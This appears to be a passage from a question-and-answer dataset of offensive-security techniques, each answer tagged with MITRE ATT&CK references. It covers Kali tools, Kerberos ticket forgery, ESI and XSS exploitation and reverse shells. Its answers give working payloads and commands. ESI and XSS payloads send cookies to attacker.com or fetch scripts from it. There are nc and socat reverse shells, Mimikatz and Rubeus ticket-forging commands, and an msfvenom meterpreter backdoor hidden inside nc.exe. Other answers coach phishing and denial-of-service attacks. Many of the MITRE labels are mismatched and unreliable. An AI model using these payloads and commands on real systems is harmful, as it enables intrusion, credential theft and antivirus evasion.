A: samdump2 version 3.0.0 can be used to retrieve password hashes from the Windows SAM (Security Accounts Manager) database by accessing the system hive and extracting the syskey bootkey. This allows the password hashes to be dumped, which can then be cracked offline. The tool is useful for penetration testing and incident response scenarios where access to the local SAM database is required. MITRE References: MITRE ID is T1003, MITRE Name is: OS Credential Dumping, and MITRE Tactics are: TA0006.

## Q: What is Token Recipient Confusion (SAML-TRC) and how can it be used in SAML attacks?
A: Token Recipient Confusion involves checking whether the Service Provider correctly validates the intended recipient of a SAML response. If a valid SAML response meant for one Service Provider can be redirected to a different Service Provider, and the target Service Provider accepts the response, it indicates a vulnerability in the recipient validation process. MITRE References: MITRE ID is T1208, MITRE Name is: Kerberoasting, and MITRE Tactics are: TA0006.

## Q: How can sbd be used for privilege escalation or post-exploitation on a system?
A: sbd can be used for privilege escalation by setting the `-s` option to invoke a root shell. If sbd is run with `setuid 0`, it will execute a root shell on connection. This can allow an attacker to gain elevated access on a compromised system. Version 1.37 of sbd is used in this example. MITRE References: MITRE ID is T1068, MITRE Name is: Exploitation for Privilege Escalation, and MITRE Tactics are: Privilege Escalation.

## Q: How can sbd be used to establish a persistent reverse shell on a target system?
A: sbd can be used to establish a persistent reverse shell by leveraging the `-r` option for continuous reconnection. An attacker can run `sbd -l -p 4444 -e bash -r 5` on the server to listen on port 4444, execute a bash shell, and continuously reconnect every 5 seconds if the connection is lost. On the client side, `sbd <server_ip> 4444` can be used to connect back to the server and maintain persistence. Version 1.37 of sbd is used in this example. MITRE References: MITRE ID is T1059, MITRE Name is: Command and Scripting Interpreter, and MITRE Tactics are: Execution, Persistence.

## Q: How can sbd be used to bypass network restrictions and establish a covert communication channel?
A: sbd can be used to bypass network restrictions and establish a covert communication channel by leveraging its built-in encryption capabilities. An attacker can run `sbd -l -p 4444 -c on -k secret` on the server to listen on port 4444 with AES-CBC-128 + HMAC-SHA1 encryption using the shared secret `secret`. On the client side, `sbd <server_ip> 4444 -c on -k secret` can be used to connect to the server and communicate over the encrypted channel. This can bypass network restrictions and create a covert communication channel. Version 1.37 of sbd is used in this example. MITRE References: MITRE ID is T1572, MITRE Name is: Protocol Tunneling, and MITRE Tactics are: Command and Control.

## Q: How can scalpel be used to carve files from a disk image during a forensics investigation?
A: Scalpel is a powerful file carving tool that can be used to extract files from disk images or raw device files, even if the file system is unknown. To use scalpel, you can run the following command:```scalpel -o output_dir disk_image.dd```This will carve all files found in the disk image and save them to the `output_dir` directory. Scalpel uses a database of file headers and footers to identify and extract the files. You can customize its behavior using various options, such as `-b` to carve even if the footer is not found, or `-q` to only extract cluster-aligned files.Scalpel version 1.60 is useful for both digital forensics investigations and file recovery tasks. MITRE References: MITRE ID is T1486, MITRE Name is: Data Encrypted for Impact, and MITRE Tactics are: Impact.

## Q: How can screen be used for privilege escalation in a penetration test?
A: Screen can be used for privilege escalation by setting the SUID bit on the screen binary. This allows the screen process to run with root privileges, even when executed by a non-root user. To do this, run the following command as root: `chmod +s /usr/bin/screen`. Now, when a non-root user runs `screen`, it will execute with elevated privileges, potentially allowing the user to perform actions they normally would not have access to. MITRE References: MITRE ID is T1088, MITRE Name is: Bypass User Account Control, and MITRE Tactics are: Privilege Escalation.

## Q: What other resources can you use to search for exploits?
A: You can also try searching for exploits on the following resources:

- [https://packetstormsecurity.com/](https://packetstormsecurity.com/) - Search for exploits by technology
- [https://vulners.com/](https://vulners.com/) - Search the Vulners database for exploits
- [https://sploitus.com/](https://sploitus.com/) - Search for exploits in other databases MITRE References: MITRE ID is T1588.004, MITRE Name is: Obtain Exploit, and MITRE Tactics are: Resource Development.

## Q: How can SQLMap exploit Second Order SQLi?
A: SQLMap can exploit Second Order SQLis. You need to provide:

* The **request** where the **sqlinjection payload** is going to be saved
* The **request** where the **payload** will be **executed**

The request where the SQL injection payload is saved is **indicated as in any other injection in sqlmap**. The request **where sqlmap can read the output/execution** of the injection can be indicated with `--second-url` or with `--second-req` if you need to indicate a complete request from a file.

For example:

```
#Get the SQL payload execution with a GET to a url
sqlmap -r login.txt -p username --second-url "http://10.10.10.10/details.php"

#Get the SQL payload execution sending a custom request from a file
sqlmap -r login.txt -p username --second-req details.txt
```

In several cases **this won't be enough** because you will need to **perform other actions** apart from sending the payload and accessing a different page. When this is needed you can use a **sqlmap tamper**. MITRE References: MITRE ID is T1557, MITRE Name is: Adversary-in-the-Middle, and MITRE Tactics are: Lateral Movement, Execution.

## Q: How can you use Secure Socket Funneling (SSF) version 3.0.0 to perform local and remote port forwarding to bypass firewall restrictions?
A: To perform local and remote port forwarding with SSF version 3.0.0, you can use the following steps:1. Run the SSF server on the remote system:   ssf_server.exe -l 22 -r 3022   This will forward the local port 22 (SSH) to the remote port 3022.2. On the local system, run the SSF client to connect to the remote server:   ssf_client.exe -H remote_host -p 3022 -l 2222 -r 22   This will forward the local port 2222 to the remote port 22 (SSH) through the secure SSF connection.You can now access the remote SSH server on port 2222 locally, bypassing any firewall restrictions between the two systems. MITRE References: MITRE ID is T1090, MITRE Name is: Remote Access Tools, and MITRE Tactics are: TA0011.

## Q: How can you use Secure Socket Funneling (SSF) version 3.0.0 to establish a secure SOCKS proxy connection to bypass network restrictions?
A: To set up a secure SOCKS proxy using SSF version 3.0.0, follow these steps:1. On the remote system, start the SSF server in SOCKS mode:   ssf_server.exe -s 1080   This will start a SOCKS server on port 1080 on the remote system.2. On the local system, connect the SSF client to the remote SOCKS server:   ssf_client.exe -H remote_host -p 1080 -S   This will establish a secure SOCKS connection through the SSF tunnel.You can now use the local SOCKS5 proxy on port 1080 to route your traffic through the remote system, bypassing network restrictions on the local network. MITRE References: MITRE ID is T1090, MITRE Name is: Remote Access Tools, and MITRE Tactics are: TA0011.

## Q: How can you remotely access hashes by creating a Reg backdoor using DAMP?
A: You can remotely access hashes by creating a Reg backdoor using the DAMP tool:

```# Allows for the remote retrieval of a system's machine and local account hashes, as well as its domain cached credentials.
Add-RemoteRegBackdoor -ComputerName <remotehost> -Trustee student1 -Verbose

# Abuses the ACL backdoor set by Add-RemoteRegBackdoor to remotely retrieve the local machine account hash for the specified machine.
Get-RemoteMachineAccountHash -ComputerName <remotehost> -Verbose

# Abuses the ACL backdoor set by Add-RemoteRegBackdoor to remotely retrieve the local SAM account hashes for the specified machine.
Get-RemoteLocalAccountHash -ComputerName <remotehost> -Verbose

# Abuses the ACL backdoor set by Add-RemoteRegBackdoor to remotely retrieve the domain cached credentials for the specified machine.
Get-RemoteCachedCredential -ComputerName <remotehost> -Verbose
``` MITRE References: MITRE ID is T1003.003, MITRE Name is: Credential Dumping: NTDS, and MITRE Tactics are: Credential Access.

## Q: How can you exploit the SeDebug and SeImpersonate privileges to escalate privileges?
A: The code provided demonstrates how to exploit the SeDebug and SeImpersonate privileges to copy the token from a process running as SYSTEM and with all the token privileges, such as `lsass.exe`, `services.exe`, `svchost.exe`, `wininit.exe`, or `csrss.exe`. The `Exploit` function searches for the `lsass.exe` process, opens its token, duplicates it, and then uses the duplicated token to spawn a new `cmd.exe` process with elevated privileges. MITRE References: MITRE ID is T1134, MITRE Name is: Access Token Manipulation, and MITRE Tactics are: TA0004.

## Q: How can I impersonate a user with higher privileges in Windows?
A: The provided C++ code allows you to indicate a Process ID as an argument and run a CMD as the user of the indicated process. By running this in a High Integrity process, you can indicate the PID of a process running as System (like winlogon, wininit) and execute a cmd.exe as system. MITRE References: MITRE ID is T1134, MITRE Name is: Access Token Manipulation, and MITRE Tactics are: PrivilegeEscalation, DefenseEvasion.

## Q: How can sendEmail be used for phishing or social engineering attacks?
A: The sendEmail tool can be used to create and send phishing emails. For example, you can spoof the sender address (-f option) to impersonate a trusted contact or organization. The message body (-m option) can be crafted to trick the recipient into revealing sensitive information or executing malicious code. Additionally, attachments (-a option) can be used to deliver malware. Version 1.56 of sendEmail is recommended for these types of attacks. MITRE References: MITRE ID is T1566, MITRE Name is: Phishing, and MITRE Tactics are: Social Engineering.

## Q: How can sendEmail be used for information gathering or reconnaissance?
A: The sendEmail tool can be used to gather information about target email servers and networks. For example, the -s option can be used to test connectivity to different mail servers, and the -v option can provide verbose output about the SMTP connection and message delivery process. This information could be used to identify valid email addresses, open mail relays, or other vulnerabilities. Version 1.56 of sendEmail is recommended for these types of reconnaissance activities. MITRE References: MITRE ID is T1589, MITRE Name is: Gather Victim Identity Information, and MITRE Tactics are: Discovery.

## Q: How can sendEmail be used to automate sending large volumes of spam or malicious emails?
A: The sendEmail tool can be used to automate the sending of large volumes of spam or malicious emails. The command-line interface and lack of dependencies make it easy to integrate into scripts or other automation tools. For example, the -t, -cc, and -bcc options can be used to send emails to multiple recipients, and the -m and -a options can be used to include malicious content. However, use of sendEmail for these purposes would be unethical and likely illegal in most jurisdictions. Version 1.56 of sendEmail is not recommended for these activities. MITRE References: MITRE ID is T1566, MITRE Name is: Phishing, and MITRE Tactics are: Impact.

## Q: How can you exploit Edge Side Inclusion (ESI) vulnerabilities?
A: You can exploit ESI vulnerabilities in various ways, such as:XSS:```<esi:include src=http://attacker.com/xss.html>```Bypass client XSS protection:```x=<esi:assign name="var1" value="'cript'"/><s<esi:vars name="$(var1)"/>>alert(/Chrome%20XSS%20filter%20bypass/);</s<esi:vars name="$(var1)"/>>```Steal cookies:```<esi:include src=http://attacker.com/$(HTTP_COOKIE)><esi:include src="http://attacker.com/?cookie=$(HTTP_COOKIE{'JSESSIONID'})" />```Steal HTTP-only cookies with XSS:```<!--esi $(HTTP_COOKIE) --><!--esi/$url_decode('"<svg/onload=prompt(1)>"')/-->```Introduce private local files:```<esi:include src="secret.txt">``` MITRE References: MITRE ID is T1190, MITRE Name is: Exploit Public-Facing Application, and MITRE Tactics are: TA0001, Initial Access.

## Q: How can you abuse the Akamai debug feature in ESI to obtain sensitive information?
A: You can abuse the Akamai debug feature in ESI to obtain sensitive information by using the following directive:```<esi:debug/>```This will send debug information included in the response, which may contain sensitive details. MITRE References: MITRE ID is T1056, MITRE Name is: Input Capture, and MITRE Tactics are: TA0009, Collection.

## Q: How can you combine ESI and XSLT to perform an XML External Entity (XXE) attack?
A: By specifying the `xslt` value for the *dca* parameter, it is feasible to include `**eXtensible Stylesheet Language Transformations (XSLT)**` based ESI. The inclusion causes the HTTP surrogate to retrieve the XML and XSLT files, with the latter filtering the former. Such XML files are exploitable for *XML External Entity (XXE)* attacks, enabling attackers to execute SSRF attacks.Example:```<esi:include src="http://host/poc.xml" dca="xslt" stylesheet="http://host/poc.xsl" />```XSLT file:```<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE xxe [<!ENTITY xxe SYSTEM "http://evil.com/file" >]><foo>&xxe;</foo>``` MITRE References: MITRE ID is T1XML, MITRE Name is: XML External Entities, and MITRE Tactics are: TA0001, Initial Access.

## Q: How can you use Metasploit to exploit a known vulnerability?
A: Metasploit is a popular penetration testing framework that can be used to exploit known vulnerabilities. First, you would use Nmap or another tool to identify potential targets and their vulnerabilities. Then, you would search the Metasploit module database for an appropriate exploit module, configure the required options, and launch the attack. Metasploit can automate much of the exploitation process, making it a powerful tool for security testing. MITRE References: MITRE ID is T1210, MITRE Name is: Exploitation of Remote Services, and MITRE Tactics are: Execution, Lateral Movement.

## Q: How can you use an XSS vulnerability to disclose the path the bot is accessing?
A: To disclose the path the bot is accessing, you can use the following payloads:

```html<!-- If the bot is accessing a file:// path, you will discover the internal pathif not, you will at least have wich path the bot is accessing --><img src="x" onerror="document.write(window.location)" />
<script> document.write(window.location) </script>```
These payloads will write the current `window.location` to the page, which can reveal the path the bot is accessing. MITRE References: MITRE ID is T1083, MITRE Name is: File and Directory Discovery, and MITRE Tactics are: Discovery.

## Q: How can you use an XSS vulnerability to load an external script?
A: To load an external script, you can use the following payloads:

```html<script src="http://attacker.com/myscripts.js"></script>
<img src="xasdasdasd" onerror="document.write('<script src="https://attacker.com/test.js"></script>')"/>```
These payloads will load a script from an attacker-controlled server, allowing the attacker to execute arbitrary code on the victim's system. MITRE References: MITRE ID is T1505, MITRE Name is: Server Software Component, and MITRE Tactics are: Persistence, Privilege Escalation.

## Q: How can you use an XSS vulnerability to perform a port scan on the local network?
A: To perform a port scan on the local network, you can use the following payload:```html<!--Scan local port and receive a ping indicating which ones are found--><script>const checkPort = (port) => {    fetch(`http://localhost:${port}`, { mode: "no-cors" }).then(() => {        let img = document.createElement("img");        img.src = `http://attacker.com/ping?port=${port}`;    });}for(let i=0; i<1000; i++) {    checkPort(i);}</script><img src="https://attacker.com/startingScan">```This payload will scan the local network for open ports and send a ping to the attacker's server for each open port found. MITRE References: MITRE ID is T1046, MITRE Name is: Network Service Scanning, and MITRE Tactics are: Discovery.

## Q: How can the Social-Engineer Toolkit (SET) be used to perform social engineering attacks?
A: The Social-Engineer Toolkit (SET) version 7.7.9 can be used to perform various social engineering attacks. The 'Social-Engineering Attacks' menu in SET provides options to launch phishing attacks, create malicious files, or conduct other social engineering techniques. For example, the 'Spear-Phishing Attack Vector' allows crafting and sending phishing emails with malicious attachments or links. The 'Webkit Server' module can be used to host web pages to trick victims into entering credentials. SET provides a comprehensive toolkit for social engineering assessments. MITRE References: MITRE ID is T1566, MITRE Name is: Phishing, and MITRE Tactics are: Execution, Credential Access, Collection.

## Q: How can SharpShooter be used to create a stageless payload that uses DNS for command and control?
A: SharpShooter v2.0 can be used to create a stageless payload that uses DNS for command and control. To do this, you can use the '--stageless' and '--dns' flags. For example, the command 'sharpshooter --stageless --dns myc2.com --payload js --output mymalware' will generate a JavaScript-based stageless payload that uses the 'myc2.com' domain for command and control. The generated payload can then be delivered to the target system. MITRE References: MITRE ID is T1071.004, MITRE Name is: Application Layer Protocol: DNS, and MITRE Tactics are: Command and Control.

## Q: How can SharpShooter be used to create a payload that uses an AMSI bypass technique?
A: SharpShooter v2.0 can be used to create payloads that use an AMSI bypass technique. To do this, you can use the '--amsi' flag and specify the bypass technique, such as 'amsienable'. For example, the command 'sharpshooter --amsi amsienable --payload js --output mymalware' will generate a JavaScript-based payload that uses the 'amsienable' technique to bypass AMSI. The generated payload can then be delivered to the target system. MITRE References: MITRE ID is T1562.001, MITRE Name is: Disable or Modify System Firewall, and MITRE Tactics are: Defense Evasion.

## Q: How can you use shellnoob to patch a binary file with custom shellcode?
A: shellnoob provides a few options to patch a binary file with custom shellcode. You can use the `--file-patch` option to patch the file at a specific offset. For example:

`shellnoob.py --file-patch /path/to/file.exe 0x1234 deadbeef`

This will patch the file at offset 0x1234 with the hex data `deadbeef`. You can also use the `--vm-patch` option to patch the file at a specific virtual memory address, which may be more useful for some scenarios. Additionally, the `--fork-nopper` option can be used to nop out calls to `fork()` in a binary, which can be helpful for certain types of shellcode or payload delivery.

Note that these binary patching features are only tested on x86 and x86_64 architectures, so use caution when applying them to other platforms. MITRE References: MITRE ID is T1497, MITRE Name is: Virtualization/Sandbox Evasion, and MITRE Tactics are: Defense Evasion.

## Q: How can I get a reverse shell on a Linux system?
A: You can use various tools and scripts to generate reverse shell payloads. For example, you can use `nc (netcat)` to get a reverse shell by running `nc -e /bin/sh <attacker_ip> <attacker_port>` on the target system. Alternatively, you can use tools like `MSFVenom` to generate more advanced reverse shell payloads. MITRE References: MITRE ID is T1059, MITRE Name is: Command and Scripting Interpreter, and MITRE Tactics are: Execution.

## Q: What are some techniques for getting a full TTY (interactive shell) on a target system?
A: To get a full TTY (interactive shell) on a target system, you can try techniques like using Python's `pty` module to spawn a pseudo-terminal, upgrading a reverse shell using `script` or `socat`, or using the `stty` command to set up the terminal settings properly. These methods help provide a more stable and feature-rich shell experience compared to a basic reverse shell. MITRE References: MITRE ID is T1055, MITRE Name is: Process Injection, and MITRE Tactics are: Privilege Escalation, Defense Evasion.

## Q: How can Shellter be used to bypass antivirus detection when executing malicious code on a Windows system?
A: Shellter can be used to bypass antivirus detection when executing malicious code on a Windows system. By injecting the shellcode directly into a legitimate, signed Windows application, Shellter can help avoid detection by AV solutions that may flag the shellcode as malicious on its own. This technique, known as DLL injection or process injection, can be an effective method for evading security controls during penetration testing or other malicious activities. MITRE References: MITRE ID is T1055, MITRE Name is: Process Injection, and MITRE Tactics are: Execution, Privilege Escalation, Defense Evasion.

## Q: How can Sherlock be used to perform social media account takeover attacks?
A: Sherlock should not be used for social media account takeover attacks, as that would be unethical and illegal. Sherlock is a tool designed to help users check the availability of usernames across social media platforms, not to gain unauthorized access to accounts. Any attempt to hijack or compromise social media accounts would violate the terms of service and could result in criminal charges. Sherlock is a useful tool for security research and username availability checking, but should be used responsibly and within the bounds of the law. MITRE References: MITRE ID is nan, MITRE Name is: nan, and MITRE Tactics are: nan.

## Q: How can you use sidguesser to guess Oracle SIDs on a target server?
A: To use sidguesser to guess Oracle SIDs on a target server, you can run the following command:

```console
root@kali:~# sidguess -i 192.168.1.205 -d /usr/share/wordlists/metasploit/unix_users.txt

SIDGuesser v1.0.5 by patrik@cqure.net
-------------------------------------

Starting Dictionary Attack (<space> for stats, Q for quit) ...
```

This will use the sidguesser tool (version 1.0.5) to attack the server at IP address 192.168.1.205 using the unix_users.txt dictionary file from the Metasploit wordlist. The tool will attempt to guess the Oracle SIDs on the target server and display the results. MITRE References: MITRE ID is T1068, MITRE Name is: Exploitation for Privilege Escalation, and MITRE Tactics are: Privilege Escalation.

## Q: How can a Golden Ticket be used to execute a SID History Injection Attack?
A: A Golden Ticket can be used to execute a SID History Injection Attack by incorporating the SID of a high-privilege group (such as Enterprise Admins or Domain Admins) from the parent domain into the SID History. This is done by using the Mimikatz tool to generate a Golden Ticket with the desired SID. The command to generate the Golden Ticket is: 'mimikatz.exe "kerberos::golden /user:Administrator /domain:<current_domain> /sid:<current_domain_sid> /sids:<victim_domain_sid_of_group> /aes256:<krbtgt_aes256> /startoffset:-10 /endin:600 /renewmax:10080 /ticket:ticket.kirbi" "exit"'. MITRE References: MITRE ID is T1208, MITRE Name is: Kerberoasting, and MITRE Tactics are: Credential Access.

## Q: How can a Diamond Ticket be used to execute a SID History Injection Attack?
A: A Diamond Ticket can be used to execute a SID History Injection Attack by incorporating the SID of a high-privilege group (such as Enterprise Admins or Domain Admins) from the parent domain into the SID History. This is done by using the Rubeus tool to generate a Diamond Ticket with the desired SID. The command to generate the Diamond Ticket is: 'Rubeus.exe diamond /tgtdeleg /ticketuser:Administrator /ticketuserid:500 /groups:512 /sids:S-1-5-21-378720957-2217973887-3501892633-512 /krbkey:390b2fdb13cc820d73ecf2dadddd4c9d76425d4c2156b89ac551efb9d591a8aa /nowrap'. MITRE References: MITRE ID is T1558, MITRE Name is: Steal or Forge Kerberos Tickets, and MITRE Tactics are: Credential Access.

## Q: How can a SID History Injection Attack be executed from a Linux system?
A: A SID History Injection Attack can be executed from a Linux system using the ticketer.py script from the Impacket suite. The flow is: 1) Obtain the SID for the Enterprise Admins group of the parent domain. 2) Retrieve the hash for the KRBTGT account in the child domain. 3) Create a Golden Ticket using the ticketer.py script. 4) Log into the parent domain. 5) Retrieve credentials for the Administrator account in the parent domain. 6) Authenticate to the parent domain's Domain Controller via Psexec. Alternatively, the raiseChild.py script can be used to automate this process. MITRE References: MITRE ID is T1134, MITRE Name is: Access Token Manipulation, and MITRE Tactics are: Privilege Escalation, Defense Evasion.

## Q: How can siege be used to perform a DDoS attack on a web server?
A: Siege version 4.0.7 can be used to perform a distributed denial-of-service (DDoS) attack against a web server. The -c option can be used to specify the number of concurrent users, and the -r option specifies the number of repetitions. For example, running `siege -c 500 -r 1000 https://example.com` would simulate 500 concurrent users sending 1000 requests each, effectively overloading the web server. This type of attack could be used to test a web application's resilience or to maliciously disrupt its availability. MITRE References: MITRE ID is T1498, MITRE Name is: Network Denial of Service, and MITRE Tactics are: Impact.

## Q: How can SILENTTRINITY be used to establish persistent access on a compromised system?
A: SILENTTRINITY includes modules that can be used to achieve persistence on a compromised system. For example, the 'persistence/registry' module can be used to create a Registry Run key to execute the SILENTTRINITY implant on system startup. Additionally, the 'persistence/schtasks' module can create a scheduled task to run the implant periodically. These persistence mechanisms leverage SILENTTRINITY's dynamic .NET scripting capabilities to maintain access to the target system. MITRE References: MITRE ID is T1053, MITRE Name is: Scheduled Task/Job, and MITRE Tactics are: Persistence.

## Q: How can SILENTTRINITY be used to gather information about the target environment?
A: SILENTTRINITY includes a variety of modules for gathering information about the target environment. For example, the 'gather/systeminfo' module can be used to collect detailed system information, such as the operating system, installed software, and network configuration. The 'gather/loggedon' module can be used to list users currently logged on to the system, and the 'gather/netview' module can map the local network and list connected hosts. These information gathering capabilities can help an attacker better understand the target environment and identify potential attack vectors. MITRE References: MITRE ID is T1082, MITRE Name is: System Information Discovery, and MITRE Tactics are: Discovery.

## Q: What is the Silver Ticket attack and how can it be used to gain access to a network?
A: The Silver Ticket attack involves the exploitation of service tickets in Active Directory (AD) environments. This method relies on acquiring the NTLM hash of a service account, such as a computer account, to forge a Ticket Granting Service (TGS) ticket. With this forged ticket, an attacker can access specific services on the network, impersonating any user, typically aiming for administrative privileges. Different tools are used for ticket crafting based on the operating system, such as Impacket's ticketer.py on Linux or Mimikatz on Windows. MITRE References: MITRE ID is T1558.002, MITRE Name is: Steal or Forge Kerberos Tickets: Silver Ticket, and MITRE Tactics are: TA0006, Credential Access.

## Q: How can sipcrack be used to crack SIP digest authentication passwords?
A: The sipcrack tool can be used to bruteforce the user passwords from a SIP digest authentication dump file. First, you can use the sipdump tool to capture and dump the SIP digest authentication information to a file. Then, you can use sipcrack to attempt to crack the passwords using a wordlist or by reading passwords from stdin. The sipcrack -w option allows you to specify a wordlist file, while the -s option reads passwords from stdin. The -p option prints the cracking progress every n passwords. Version 0.2 of sipcrack is used in this example. MITRE References: MITRE ID is T1110, MITRE Name is: Brute Force, and MITRE Tactics are: TA0006.

## Q: How can sipp (v3.3-1kali5) be used to conduct a denial-of-service attack?
A: sipp can be used to conduct a denial-of-service (DoS) attack by sending a large number of concurrent SIP requests to a target system. To do this, you can use the following command:

```
sipp -sn uac -r 100 -l 2000 <target_ip>:5060
```

This will send 100 SIP INVITE requests per second, up to a maximum of 2000 concurrent calls. The high call rate and number of concurrent calls can overwhelm the target system's resources, leading to a denial-of-service. 

MITRE ATT&CK:
ID: T1498
Name: Network Denial of Service
Tactics: Impact MITRE References: MITRE ID is T1498, MITRE Name is: Network Denial of Service, and MITRE Tactics are: Impact.

## Q: How can sipsak 0.9.8.1 be used to perform SIP message flooding attacks against a target SIP server or device?
A: To perform SIP message flooding attacks with sipsak 0.9.8.1, you can use the 'flood mode' (-F). The '--expires=NUMBER' option can be used to set the Expires header value, which determines how long the SIP message is valid. The '--sleep=NUMBER' option can be used to control the delay between sending each SIP message. This can help overwhelm the target SIP server or device with a high volume of SIP requests, potentially causing a denial of service. MITRE References: MITRE ID is T1499, MITRE Name is: Endpoint Denial of Service, and MITRE Tactics are: Impact.

## Q: How can sipsak 0.9.8.1 be used to perform SIP user enumeration and discovery against a target SIP server or device?
A: To perform SIP user enumeration and discovery with sipsak 0.9.8.1, you can use the 'usrloc mode' (-U) along with the '--appendix-begin=NUMBER' and '--appendix-end=NUMBER' options. This allows you to send REGISTER requests with a range of user names, which can help identify valid user accounts on the target SIP server or device. MITRE References: MITRE ID is T1589, MITRE Name is: Gather Victim Identity Information, and MITRE Tactics are: Discovery.

## Q: How can the svcrack tool be used to perform password guessing attacks against SIP devices?
A: The svcrack tool is an online password guessing tool for SIP devices. It can be used to crack passwords on both registrar servers and proxy servers. Some key usage examples include:- Cracking passwords using a dictionary file with the `-d` option: `svcrack -u100 -d dictionary.txt udp://10.0.0.1:5080`- Cracking passwords using a numeric range with the `-r` and `-z` options: `svcrack -u100 -r1-9999 -z4 10.0.0.1`- Reusing the nonce to speed up cracking with the `-n` option- Enabling scanning for common default/typical passwords with the `--enabledefaults` optionThe tool supports various options to customize the attack, such as setting the source/destination ports, binding to a specific IP, adjusting the timeout, and saving/resuming the session. MITRE References: MITRE ID is T1110, MITRE Name is: Brute Force, and MITRE Tactics are: CredentialAccess.

## Q: How can the svcrash tool be used to detect and respond to unauthorized scans from tools like svcrack and svwar?
A: The svcrash tool can be used to detect and respond to unauthorized scans from SIPVicious tools like svcrack and svwar. Some key usage examples include:- Automatically send responses to detected attacks using the `--auto` option- Specify the attacker's IP address and port with the `-d` and `-p` options to target the response- Brute force the attacker's port using the `-b` option if the port is unknownThe tool can be used to disrupt unauthorized scans and prevent further exploitation of the targeted SIP devices. MITRE References: MITRE ID is T1036, MITRE Name is: Masquerading, and MITRE Tactics are: DefenseEvasion.

## Q: How can Sliver be used to create custom malware payloads for penetration testing?
A: Sliver can be used to create customized malware payloads for penetration testing. The `sliver-server` command can be used to generate and configure Sliver implants with unique X.509 certificates signed by a per-instance certificate authority. These implants can then be used to establish C2 communication over Mutual-TLS, HTTP(S), or DNS. Sliver version 1.5.41 supports a variety of features for payload generation and deployment. MITRE References: MITRE ID is T1189, MITRE Name is: Drive-by Compromise, and MITRE Tactics are: Initial Access.

## Q: What are some ways Sliver can be used to perform lateral movement within a compromised network?
A: Sliver version 1.5.41 includes various post-exploitation capabilities that can be used for lateral movement, such as Windows named pipe pivoting, Secure Shell (SSH) pivoting, and the ability to execute arbitrary commands on compromised hosts. Sliver implants can also be used to enumerate and interact with Active Directory domains, extract credentials, and move laterally between systems. MITRE References: MITRE ID is T1210, MITRE Name is: Exploitation of Remote Services, and MITRE Tactics are: Lateral Movement.

## Q: How could smali/baksmali be used to bypass Android security controls?
A: smali/baksmali can be used to reverse engineer and modify the bytecode of Android applications. This could allow an attacker to bypass security controls, inject malicious code, or extract sensitive data from the app. For example, an attacker could use baksmali to decompile an app, locate security checks, and then use smali to reassemble the app with the checks removed. Version 2.5.2 of smali/baksmali was used. MITRE References: MITRE ID is T1211, MITRE Name is: Trusted Developer Utilities Abuse, and MITRE Tactics are: TA0005.

## Q: How can sn0int be used to perform OSINT and gather intelligence on a target?
A: sn0int version 0.26.0 can be used to semi-automatically gather OSINT and enumerate a target's attack surface. For example, to search for information about a domain, you can run the command `sn0int run dns.query domain=example.com`. This will query public DNS records and extract potential subdomains, email addresses, and other information. You can also use the `sn0int run whois.query domain=example.com` command to gather WHOIS data about the domain. sn0int includes many built-in modules for tasks like IP geolocation, search engine queries, social media lookups, and more. MITRE References: MITRE ID is T1591, MITRE Name is: Gather Victim Host Information, and MITRE Tactics are: Information Gathering.

## Q: How can sn0int be used to perform reconnaissance on a target and gather information for a potential social engineering attack?
A: sn0int version 0.26.0 can be used to gather open-source intelligence (OSINT) that could be useful for a social engineering attack. For example, you can use the `sn0int run search.google query='example.com employee names'` command to search for employee information about the target organization. You can also use the `sn0int run search.twitter query='example.com employees'` command to search for social media profiles of the target's employees. This information could be used to craft more convincing phishing or social engineering attacks. MITRE References: MITRE ID is T1598, MITRE Name is: Phishing for Information, and MITRE Tactics are: Credential Access, Collection.

## Q: How can SniffJoke be used to bypass network monitoring and intrusion detection systems?
A: SniffJoke is a tool that can be used to bypass network monitoring and intrusion detection systems by transparently modifying and injecting fake packets into TCP connections. It can delay, modify, and inject fake packets to make them appear 'normal' and almost impossible to be correctly read by a passive wiretapping technology. The latest version is 0.4.1-1kali2. MITRE References: MITRE ID is T1090, MITRE Name is: Proxy, and MITRE Tactics are: Command and Control.

## Q: How do you leak script content by converting it to UTF16?
A: This writeup leaks a text/plain because there is no `X-Content-Type-Options: nosniff` header by adding some initial characters that will make JavaScript think that the content is in UTF-16 so the script doesn't break. MITRE References: MITRE ID is T1132, MITRE Name is: Data Encoding, and MITRE Tactics are: Defense Evasion, Exfiltration.

## Q: How do you leak script content by treating it as an ICO?
A: The next writeup leaks the script content by loading it as if it was an ICO image, accessing the `width` parameter. MITRE References: MITRE ID is T1083, MITRE Name is: File and Directory Discovery, and MITRE Tactics are: Discovery.

## Q: How can you inject commands for execution on the SNMP service?
A: Injecting commands to run on the SNMP service requires the existence and executability of the called binary/script. The `NET-SNMP-EXTEND-MIB` mandates providing the absolute path to the executable.

To confirm the execution of the injected command, the `snmpwalk` command can be used to enumerate the SNMP service. The output will display the command and its associated details, including the absolute path:

```
snmpwalk -v2c -c SuP3RPrivCom90 10.129.2.26 NET-SNMP-EXTEND-MIB::nsExtendObjects
``` MITRE References: MITRE ID is T1574, MITRE Name is: Hijack Execution Flow, and MITRE Tactics are: Defense Evasion, Execution.

## Q: How can socat be used to establish a reverse shell connection?
A: Socat version 1.8.0.0 can be used to establish a reverse shell connection. On the attacker machine, run the command: `socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp-connect:<victim_ip>:<victim_port>`. This will create a reverse shell that connects back to the attacker's machine. On the victim machine, run the command: `socat file:`tty`,raw,echo=0 tcp-listen:<victim_port>,reuseaddr,fork`. This will set up the listener on the victim machine to receive the reverse shell connection. MITRE References: MITRE ID is T1059, MITRE Name is: Command and Scripting Interpreter, and MITRE Tactics are: Execution.

## Q: How can you auto-download a malicious file on a webpage?
A: To auto-download a malicious file on a webpage, you can add a script like this:

<script> document.location.href = 'shell53.exe'; </script>

Or:

<html>
<head>
<meta http-equiv="refresh" content="0; url=shell53.exe">
</head>
</html>

The user will then have to accept the download and execute the file for it to run. You can also try to trick the user by changing the filename to something innocuous like 'shell.jpg.exe' to make it look like a normal image file. MITRE References: MITRE ID is T1189, MITRE Name is: Drive-by Compromise, and MITRE Tactics are: Initial Access.

## Q: How can you embed malicious code in a legitimate file to bypass antivirus detection?
A: To embed malicious code in a legitimate file, you can use a tool like msfvenom to create a malicious executable that is embedded within another file:

msfvenom -a x86 --platform windows -x nc.exe -k -p windows/meterpreter/reverse_tcp lhost=192.168.1.101 lport=53 -e x86/shikata_ga_nai -i 3 -b "\x00" -f exe -o ncMalicious.exe

